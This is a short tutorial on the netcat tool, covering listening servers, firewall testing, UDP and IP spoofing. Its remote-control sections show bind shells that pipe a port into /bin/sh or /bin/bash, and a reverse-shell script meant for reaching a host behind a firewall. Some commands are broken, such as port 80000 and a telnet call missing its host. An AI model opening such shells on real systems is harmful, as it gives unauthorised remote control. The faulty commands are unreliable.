NETCAT
======

Objective
---------

Using netcat program for networking



What is netcat
--------------
This is the swiss-army knife for networking. It can behave as telnet,
server, remote control ,etc.



Basic server
------------
You can start a basic server as follows:


	nc -l -p 8000

or 

	nc -n -v  -l -p 8000


where -n = do not resolve, -v = verbose, -l = listen, -p = port


Connect with:

	telnet 192.168.0.1 80000

or,

	nc 192.168.0.1 8000

You can then type in any string to send back and forth, in full-duplex
mode.


You can also run a command remotely.



Firewall Testing
----------------
Some firewalls block nmap scans.  So the only way to test a firewall
is to simulate a server. For example, if you wanted to check if your firewall
is blocking port 25.  Stop sendmail first, then:

	nc -v -n -l -p 25 

then try to connect to it using telnet:

	telnet 192.168.0.1 25






Remote Control
--------------

Start server:


	nc -l -p 8000 | /bin/sh
	
	or
	
	nc -l -p 8000 -e /bin/bash


Connect to server:

	telnet 192.168.0.1 8000


Enter any command. It will be executed on the server.





Reverse Telnet
--------------

The Architecture is shown in Fig A below:


	  User's Machine		Remote Host
	  [ 192.168.0.2 ]		[ 192.168.0.1 ]

	[1] nc -n -v -l -p 8000		[3] reverseTelnet.sh 
	[2] nc -n -v -l -p 2500 


[1] Start a server listening on port 8000
[2] Start another server listening on port 2500
[3] Start the reverseTelnet.sh script


The reverseTelnet.sh:

[reverseTelnet.sh]

snip.............................................................

#!/bin/sh

/usr/bin/telnet 192.168.0.2 8000 | /bin/sh | /usr/bin/telnet 2500


snip...........................................................


The User then types commands in the window where port 8000 runs
The command is executed on the Remote Host and the result piped back
to User's machine in the window which runs port 2500.


Useful for communicating and running commands on a host behind a firewall.





UDP
---

All the examples above are connection-oriented TCP protocol.
For UDP:

	nc -l -u -p 8000

Then to send UDP packets from stdin:

	nc -u 192.168.0.1 8000

Then type string and it will be sent to server.



Altering sender's IP
-------------------
The sender's IP address can be spoofed as follows:


	ifconfig eth0:1 192.168.0.8


where 192.168.0.8 is the spoofed IP.

Then:

	nc -s 192.168.0.8 192.168.0.1


where 192.168.0.1 is the remote server
The server will log 192.168.0.8 as the client IP.




Altering MAC addresses 
----------------------
MAC spoofing has already been described in the section
"Altering MAC address" in the chapter Networking.txt.



